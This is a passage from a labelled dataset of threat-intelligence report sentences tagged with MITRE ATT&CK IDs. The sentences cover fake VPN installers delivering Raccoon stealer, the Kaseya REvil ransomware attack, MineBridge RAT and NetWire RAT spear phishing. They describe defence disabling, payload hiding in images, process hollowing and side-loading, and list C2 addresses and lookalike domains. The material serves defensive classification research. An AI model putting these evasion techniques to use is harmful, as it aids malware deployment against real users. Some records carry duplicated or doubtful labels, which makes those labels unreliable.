an attacker comprehensive access to their employer\u2019s systems,\u00a0especially if no or inadequate security policies are in place for BYOD across the enterprise.", "labels": ["T1199"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "###### Infographic 1: Possible Impacts of New Supply Chain Approaches; \u00a9 QuoIntelligence", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "In\u00a0all\u00a0these\u00a0supply chain intrusion vectors, reacting to an attack post-mortem is technically challenging and resource intensive, involving network and host-based forensics.", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "The widely covered SolarWinds Orion attack that affected around 18,000 entities should not\u00a0be seen as\u00a0an extraordinary anomaly, but\u00a0as\u00a0a single blip in\u00a0a\u00a0continuous uptick\u00a0of\u00a0threat actors launching campaigns exploiting similar weaknesses in supply chains.", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "Particularly\u00a0accelerated by\u00a0the COVID-19 pandemic,\u00a0[we forecast espionage-driven supply chain attacks\u00a0will become\u00a0a major part of the threat landscape in 2021](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/).", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "President Biden also stated that the US needs to\u202f*\u201cclose supply chain vulnerabilities across a range of critical products on which the US is dangerously dependent on foreign suppliers.\u201d*\u00a0", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "The Biden administration\u00a0claims it\u00a0will [monitor supply chain vulnerabilities](https://joebiden.com/supplychains/), designate vital products,\u00a0and enhance resiliency, while also increasing domestic production and limiting anti-competitive practices that threaten those chains.", "labels": ["T1195"], "document": "quoteintelligence_2021-01-27_supply-chain-attacks-cybersecurity-regulations"}, {"sentence": "Threat Actors Distribute Malicious VPN Apps Masquerading as Popular Vendors", "labels": ["T1036"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "In May 2021, Zscaler ThreatLabZ observed several new domains registered by a threat actor for distribution of spoofed and malicious versions of popular VPN softwares.", "labels": ["T1036"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "We observed this particular actor spoofing VPN applications, such as NordVPN, F-secure Freedom VPN, Avast Secureline VPN, and Hotspot Shield, to distribute the infostealer known as Raccoon stealer.", "labels": [], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Several lookalike websites containing malicious download links were hosted on domains registered by the actor in May 2021 using the Njalla domain hosting provider.", "labels": ["T1583"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Njalla has been used in the past by advanced persistent threat (APT) actors, such as Lazarus and Sandworm.", "labels": ["G0032", "G0034"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "For this blog, we performed a deep-dive technical analysis of the malicious setup files, the evasion techniques used, and the final payload delivered.", "labels": ["TA0005"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "The attack starts when users visit a lookalike website registered by the threat actor to distribute VPN applications.", "labels": ["T1608"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "As an example, **the domain: vpnnords[.]com** was registered by the attacker and used to host the webpage as shown in Figure 1.", "labels": ["T1608"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "The only difference is that the \u201cDownload Free\u201d button on this page leads to the download of a malicious NordVPN setup file hosted on a file-sharing website.", "labels": ["T1566"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "The downloaded file looks like a legitimate setup file of NordVPN\u2014it uses the same file icon and even displays the graphical user interface (GUI) of NordVPN\u2014but performs malicious activities in the background, which we describe in detail in the technical analysis section.", "labels": ["T1036"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Similar to the legitimate NordVPN setup file, the fake NordVPN setup is packaged using Inno Installer, but the file structure inside the package is different.", "labels": ["T1204", "T1027"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "*Figure 3:\u00a0File structure for Inno-packaged fake and legitimate NordVPN setup files*", "labels": ["T1027", "T1204"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "* **The Inno package installer script \u2013\u00a0install\\_script.iss.**", "labels": ["T1027"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "All the files inside the package are encrypted using a password as defined in the **[Setup] section** of the installer script", "labels": ["T1027"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "In this section, we perform a technical analysis of the individual components packaged inside the malicious setup file.", "labels": ["T1027"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "All the script (VBS and BAT) file components in this package follow a naming convention.", "labels": ["T1059", "T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "STRTbbbn7przuvwav4hbpbps.vbs \u00a0= \u201cSTRT\u201d \u00a0+ \u201cbbbn7przuvwav4hbpbps\u201d + \u201c.vbs\u201d", "labels": ["T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "AVDbbbn7i3b4ho55ck6raahj.bat = \u201cAVD\u201d + \u201cbbbn7i3b4ho55ck6raahj\u201d + \u201c.bat\u201d", "labels": ["T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "DELbbbn7l3bnchd166d2hhhv.bat = \u201cDEL\u201d + \u201cbbbn7l3bnchd166d2hhhv\u201d + \u201c.bat\u201d", "labels": ["T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "#### **VBScript analysis**", "labels": ["T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "This VBScript is big in size because of the inclusion of junk instructions, which\u00a0declare a lot of variables that are not used anywhere in the code.", "labels": ["T1059", "T1027"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "*Figure 4: Cleaned up VBScript.*", "labels": ["T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "The main purpose of this script is to execute the three\u00a0BAT files, described in the next section.", "labels": ["T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "The VBScript creates a delay between the execution of each BAT script using a random delay parameter, calculated as follows.", "labels": ["T1059", "T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "#### **BAT files analysis**", "labels": ["T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "This BAT file is mainly responsible for disabling security software\u00a0on the machine.", "labels": ["T1059", "T1562"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "To disable the security service features, it leverages *reg.exe* to alter the Windows registry keys specific to Windows Defender and Exploit Guard.", "labels": ["S0075", "T1562", "T1112"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "In addition, the file disables system services and scheduled tasks related to Windows Defender.", "labels": ["T1562"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Similar to the VBS file, this BAT file is large.", "labels": ["T1059", "T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "This is because long\u00a0strings of Base64-encoded data are included in the file and the commands are inserted between them, as shown in Figure 5.", "labels": ["T1027"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "*Figure 5: Commands inserted between Base64-encoded blobs in the BAT file*", "labels": ["T1027", "T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "The complete list of commands executed by this BAT file to disable security services and features is included in Appendix.", "labels": ["T1562"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "**Filename:** main.bat", "labels": ["T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "This BAT file uses a byte order mark (BOM) in the first two\u00a0bytes, in which it displays only Unicode characters when the file is opened using Notepad++ or any other text editor.", "labels": ["T1027"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "*Figure 6: Byte order mark (BOM) inserted in first two bytes of the BAT file*", "labels": ["T1027", "T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Figure 7: Cleaned BAT file", "labels": ["T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "The main actions performed by this BAT file are:", "labels": ["T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "3.Decrypts and extracts the contents of file.zip using the password: \"\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_7876pwd4897pwd19506\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\"", "labels": ["T1140"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "4.Extracts all the components after decrypting and renames file.zip to file.bin", "labels": ["T1140", "T1140"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "After further analysis, we discovered that an open-source anti-antivirus obfuscator was used to package the files.", "labels": ["T1027"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "This obfuscator will generate a BAT file and package everything using 7zip to create an encrypted and password-protected, multilayer archive file.", "labels": ["T1027", "T1027"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "In our case, the archive file is called file.bin", "labels": ["T1027"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "This is an encrypted ZIP archive that, when decrypted, with the password\u00a0*\u201c\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_7876pwd4897pwd19506\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\u201d* contains the following main components:", "labels": ["T1027"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "This is an encrypted ZIP archive that, when decrypted, with the password*\u201c\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_7876pwd4897pwd19506\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\u201d* contains the following main components:", "labels": ["T1140"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Sihost.exe - 32-bit .NET Binary", "labels": ["T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Deletes all the components that were used in the initialization stage of the setup.", "labels": ["T1070"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "When the Inno packaged fake NordVPN setup is executed, it extracts the legitimate NordVPN setup file to the path: *\"%ProgramFiles%\\\"\u00a0or \"%ProgramFiles(x86)%\\\"*, while all the malicious operation-related files are extracted to the path\u00a0*\"%SystemDrive%\\ProgramData\\SZUCiTYO44EalgWu\\\"*.", "labels": ["T1204"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "As per the [Run] section of the installer Inno script, the legitimate NordVPN setup is executed first, followed by the malicious VBScript execution.", "labels": ["T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Operating in this order prevents the end-user from suspecting that any malicious activity is being performed on the user's machine.", "labels": ["T1036"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Figure 8\u00a0below shows the installation window that is displayed to the end-user as a result of legitimate NordVPN setup execution, while the malicious activity is being performed in the background.", "labels": ["T1036"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "As described earlier, the VBS\u00a0and BAT scripts' execution finally results in dropping and executing the .NET binary with the name, sihost.exe.", "labels": ["T1059", "T1059", "T1059", "TA0002", "T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Similar to all the payloads in the infection chain, the .NET binary is obfuscated and consists of multiple layers that make\u00a0binary analysis difficult and help\u00a0to bypass the AV products.", "labels": ["T1059", "T1027", "TA0005"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "On execution, it loads the next layer binary, which is stored as an image in the resource section with the full resource path **\u201cStarEggControl.frmSolucao2.image1\u201d** and it is constructed using individual pixel information from the stored image.", "labels": ["T1027", "T1027"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "*Figure 9: Image to binary construction using individual pixels*", "labels": ["T1027"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Once the binary construction is complete, the binary is loaded as a runtime module.", "labels": ["T1140"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "The module is a .NET DLL with the name SampleUI.dll.", "labels": ["T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "**ugz1:** \"54776F5061746873\" \u2013 Encoded resource name for next layer binary", "labels": ["T1140"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "**ugz3:** \"59596A6F71\" \u2013\u00a0Encoded key which is used to decrypt the next layer binary", "labels": ["T1140"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "**projname:** \u201cStarEggControl\u201d \u2013\u00a0Project name of main .NET binary", "labels": ["T1059"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Similar to the previous layer, the SampleUI.dll also loads the next layer binary, which is stored as a bitmap image inside the resources of the main binary itself.", "labels": ["T1027"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "The resource name when decoded using the parameter ugz1 is:\u00a0**\"TwoPaths\"** and the full resource path is:\u00a0 **\u201cStarEggControl.Resources.TwoPaths\u201d**.", "labels": ["T1140"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "The next-layer binary is constructed from the retrieved Bitmap image using a custom algorithm implementation that uses XOR operation.", "labels": ["T1001", "T1140"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "The XOR key is derived using the parameter *ugz3* which turns out to be **\"YYjoq\"**.", "labels": ["T1140"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "The constructed binary is again loaded as a runtime module, which is also a .NET DLL with the name **\u201c\u516cjrxl\u7684A\u592a wCe\u201d**.", "labels": ["T1574"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Code execution is transferred to the DLL by calling the class with the name:\u00a0**\u201c\u516cjrxl\u7684A\u592a wCe.d\u53f8J\u7269rU\u65cf\u5bb6\u7684v\u884c\u662fo.z\u5b98\u53f8C\u751fbqT\u7684A\u201d.**", "labels": ["T1574"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Please note that the class and method names inside the .NET binary contain Unicode characters to deter the process of static analysis and reverse engineering.", "labels": ["T1140"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Figure 10\u00a0below shows the code flow for binary construction, loading, and transfer of code execution.", "labels": ["TA0002"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "*Figure 10: Decoding the bitmap to binary and transferring execution*", "labels": ["T1140"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Executing further, the malware payload is decrypted, a new suspended version of the main .NET binary sihost.exe is created, and the malware payload is injected into the suspended process using the Hollow Process Injection technique.", "labels": ["T1059", "T1055"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "The injected malware payload is the well-known information stealerknown as Raccoon stealer.", "labels": ["T1055"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "We have not confirmed whether the\u00a0Raccoon stealer is the final payload for all the samples, but they seem similar to the current attack.", "labels": [], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "| T1204.002 | User Execution: Malicious File | User executes the downloaded file |", "labels": ["TA0002"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "| T1124 | System Time Discovery | One of Raccoon capabilities |", "labels": [], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "| T1087 | Account Discovery | One of Raccoon capabilities |", "labels": [], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "| T1124 | File and Directory Discovery | One of Raccoon capabilities |", "labels": [], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "| T1057 | Process Discovery | One of Raccoon capabilities |", "labels": [], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "| T1012 | Query Registry\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 | One of Raccoon capabilities |", "labels": [], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "| T1113 | Screen Capture | One of Raccoon capabilities |", "labels": [], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "| T1082 | System Information Discovery | One of Raccoon capabilities |", "labels": [], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "| T1016 | System Network Configuration Discovery | One of Raccoon capabilities |", "labels": [], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "| T1573.001 | Encrypted Channel: Symmetric Cryptography | One of Raccoon capabilities |", "labels": [], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "| 0d2acc1da9ea3c2f98bcbc3ce872beb7 | Raccoon Stealer |", "labels": [], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "**// Commands executed to disable system security services**", "labels": ["T1562"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "**// Altering scheduled tasks on the machine related to security services.**", "labels": ["T1053"], "document": "zscaler_2021-05-21_threat-actors-distribute-malicious-vpn"}, {"sentence": "Coverage Advisory for Kaseya VSA Supply-Chain Ransomware Attack", "labels": ["T1195"], "document": "zscaler_2021-07-04_coverage-advisory-kaseya-vsa-supply"}, {"sentence": "Zscaler Threatlabz is actively tracking the Kaseya VSA supply-chain ransomware attack incident, involving REvil/Sodinokibi ransomware targeting a number of Managed Service Providers (MSPs) and [encrypting data for 1000+ businesses](https://www.bleepingcomputer.com/news/security/revil-ransomware-hits-1-000-plus-companies-in-msp-supply-chain-attack/) they manage.", "labels": ["T1486", "S0496", "T1486", "T1195"], "document": "zscaler_2021-07-04_coverage-advisory-kaseya-vsa-supply"}, {"sentence": "As per the Kaseya, they have identified the vulnerability that was possibly exploited to compromise the VSA server and will soon release the patch.", "labels": ["T1190"], "document": "zscaler_2021-07-04_coverage-advisory-kaseya-vsa-supply"}, {"sentence": "Based on information available till now, it appears that a zero day vulnerability in the VSA server software was potentially exploited in order to plant a custom malware loader and eventually distribute [REvil](/press/zscaler-ransomware-report-reveals-sophisticated-double-extortion-attacks-are-targeting) ransomware to the target systems.", "labels": ["S0496", "T1486", "T1190", "T1105"], "document": "zscaler_2021-07-04_coverage-advisory-kaseya-vsa-supply"}, {"sentence": "The compromised version of VSA will drop a .crt file to a specific path in c:\\ which is believed to be distributed through updates from the VSA server.", "labels": ["T1195"], "document": "zscaler_2021-07-04_coverage-advisory-kaseya-vsa-supply"}, {"sentence": "A PowerShell command will then disable various Microsoft Defender security measures before decoding the .crt file using legitimate Windows certuit.exe command.", "labels": ["S0160", "T1059", "T1562", "T1140"], "document": "zscaler_2021-07-04_coverage-advisory-kaseya-vsa-supply"}, {"sentence": "The extracted file is saved as *agent.exe* in the same folder and is responsible for encrypting data on the victim machine.", "labels": ["T1140", "T1486"], "document": "zscaler_2021-07-04_coverage-advisory-kaseya-vsa-supply"}, {"sentence": "The attacker is leveraging DLL Side Loading technique by making use of an older version of legitimate MS Defender executable to launch the malicious REvil DLL on the victim machines.", "labels": ["S0496", "T1574", "T1036", "T1574"], "document": "zscaler_2021-07-04_coverage-advisory-kaseya-vsa-supply"}, {"sentence": "While details of this incident are still surfacing and we will update this advisory further, following are some of the best practices for safeguarding and limiting impact from supply-chain attacks.", "labels": ["T1195"], "document": "zscaler_2021-07-04_coverage-advisory-kaseya-vsa-supply"}, {"sentence": "* Extend command-and-control protection to all ports and protocols with the Advanced Cloud Firewall (Cloud IPS module), including emerging C2 destinations.", "labels": ["TA0011", "TA0011"], "document": "zscaler_2021-07-04_coverage-advisory-kaseya-vsa-supply"}, {"sentence": "Zscaler leveraged the details on the countermeasures published to ensure coverage against the variant of REvil/Sodinokibi ransomware.", "labels": ["S0496", "T1486"], "document": "zscaler_2021-07-04_coverage-advisory-kaseya-vsa-supply"}, {"sentence": "As always, Cloud Sandbox plays a critical role in blocking newer variants of ransomware payloads and providing protection against patient zero infection.", "labels": ["T1486"], "document": "zscaler_2021-07-04_coverage-advisory-kaseya-vsa-supply"}, {"sentence": "Fig: Zscaler sandbox report REvil sample involved in Kaseya supply chain attack", "labels": ["S0496"], "document": "zscaler_2021-07-04_coverage-advisory-kaseya-vsa-supply"}, {"sentence": "The Zscaler ThreatLabz team is actively monitoring this campaign and any activity around REvil/Sodinokibi ransomware to ensure coverage for newer IOCs as they are discovered.", "labels": ["S0496", "T1486"], "document": "zscaler_2021-07-04_coverage-advisory-kaseya-vsa-supply"}, {"sentence": "The detailed technical analysis of the REvil payload used in Kaseya's VSA server supply chain ransomware attack can be found [here](/blogs/security-research/kaseya-supply-chain-ransomware-attack-technical-analysis-revil-payload).", "labels": ["S0496", "T1486"], "document": "zscaler_2021-07-04_coverage-advisory-kaseya-vsa-supply"}, {"sentence": "ThreatLabZ June 2021 Report: Deconstructing Kaseya Supply-Chain Attack and the Minebridge RAT Campaign", "labels": ["T1195"], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "This month, we deconstructed the new Kaseya VSA supply-chain attack and took a deep dive into the Minebridge RAT infection chain.", "labels": ["T1195"], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "### **The REvil hackers come back with a Kaseya supply-chain ransomware attack**", "labels": ["S0496", "T1486", "T1195", "T1486"], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "Based on the most recent information, the REvil gang exploited a zero-day vulnerability in Kaseya VSA server to compromise on-prem versions of VSA Server and then distributed REvil ransomware to target systems belonging to several downstream organizations.", "labels": ["S0496", "S0496", "T1486", "T1190"], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "The threat actor behind this attack used the compromised Kaseya VSA server to send a malicious script to all clients managed by that VSA server.", "labels": ["T1195"], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "The script disables some features of Windows Defender and then installs ransomware.", "labels": ["T1486", "T1562", "T1486"], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "*Figure 1: Kaseya ransomware attack batch script*", "labels": ["T1486", "T1059"], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "This variant of REvil (aka Sodinokibi) ransomware uses several techniques to evade security products, including a custom packer.", "labels": ["S0496", "S0496", "T1486", "TA0005", "T1027"], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "The REvil payload is distributed as a portable executable (PE) with a modified header.", "labels": ["S0496", "T1055"], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "One of the key lessons from both SolarWinds Orion and Kaseya VSA supply-chain attacks is that it is vital for organizations to **restrict external access to and from these critical IT management assets**.", "labels": ["T1195"], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "### **Demystifying the full attack chain of MineBridge RAT**", "labels": [], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "In March 2021, we saw threat actors start distributing MineBridge RAT with an updated distribution mechanism.", "labels": ["TA0001"], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "The attack involved a remote access trojan (RAT) that exploits an older vulnerable version of TeamViewer for DLL side-loading, enabling the threat actor to take a wide array of remote follow-on actions.", "labels": ["T1203", "T1574"], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "These actions include things such as spying on users or deploying additional malware.", "labels": ["TA0009", "T1105"], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "*Figure 2: Complete end-to-end attack chain used to deliver MineBridge RAT*", "labels": ["T1195"], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "We discovered that the threat actors are now distributing MineBridge RAT through Windows Installer binaries, masquerading as trading applications.", "labels": ["T1036"], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "The different stages in this sophisticated attack chain leverage Windows scheduled tasks, PowerShell scripts, reverse SSH tunnels, legitimate binaries such as TeamViewer, and shortened URLs that ultimately lead to the MineBridge RAT execution.", "labels": ["T1053", "T1059", "T1036"], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "The Minebridge RAT threat actors registered the domain \"tradingview[.]cyou,\" a look-alike of the legitimate website \"tradingview[.]com.", "labels": [], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "Our ThreatLabZ team has [a complete technical breakdown of the Minebridge RAT attack in our blog](/blogs/security-research/demystifying-full-attack-chain-minebridge-rat).", "labels": [], "document": "zscaler_2021-07-12_threatlabz-june-2021-report-deconstructing"}, {"sentence": "Targeted Attack on Government Organizations Delivers Netwire RAT", "labels": ["S0198", "S0332"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "The Zscaler ThreatLabz team has observed an interesting spear phishing campaign beginning July 2021 in which a threat actor is targeting a wide range of organizations in Pakistan.", "labels": ["T1566"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "NetwiredRC is being used as the final payload in this attack campaign.", "labels": ["S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "The combination of spear phishing and the use of information stealing RAT indicates that this is not a simple cyber crime, but a larger cyberattack campaign targeting multiple government organizations in Pakistan along with other industry verticals.", "labels": ["T1566"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Attack chain infographic](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/Attack%20chain%20infographic.png)", "labels": ["S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "1.The attack has targeted multiple Pakistani government organizations using spear phishing emails.", "labels": ["T1566"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "2.Lures use email info stolen from the actual website of the Pakistan government (*Ministry of Information technology and telecommunication*).", "labels": ["T1594"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "4.NetwireRAT, a well-known malware for stealing sensitive information, is being used as the final payload in the attack.", "labels": ["S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "5.Stolen information is sent using a proxy server in obfuscated form using the api *WinHttpGetIEProxyConfigForCurrentUser()* to command and control server 66[.]42.43.177:443", "labels": ["TA0011", "T1041"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "One of the latest spearphishing emails was sent from a spoofed email ID <[[email\u00a0protected]](/cdn-cgi/l/email-protection)> masquerading as \u201cNational Cyber Security Policy Feedback,\u201d impersonating a government account which may be known by the target.", "labels": ["T1566"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "During analysis, we found that the originating IP of the email is 209[.]58.188.82 which belongs to Hong Kong and has been [reported](https://www.abuseipdb.com/check/209.58.188.82) for multiple phishing attacks in the past.", "labels": ["T1566"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Spoofed email from <feedback.ncsp@moitt.gov.pk>](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/email.PNG)", "labels": ["S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "The email was sent on Wednesday, June 30, 2021 10:44 AM (PKT) with the subject \u201cCyber Security Policy Consultation Draft Final Update\u201d to lure the recipients into opening an attached file named \u201cNSCP-DRAFT-Final.docm\u201d.", "labels": ["T1566", "T1566"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "Upon further research, it seems that the email info has been copied from the Ministry of Information Technology & Telecommunication site.", "labels": ["T1594"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "![Email info from MoITT site.](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/NetwireRAT/moiTT.jpg)", "labels": ["S0198"], "document": "zscaler_2021-07-14_targeted-attack-government-organizations-delivers"}, {"sentence": "Digging into the message source of the email, we can see that the spearphishing email is targeting users from a number of 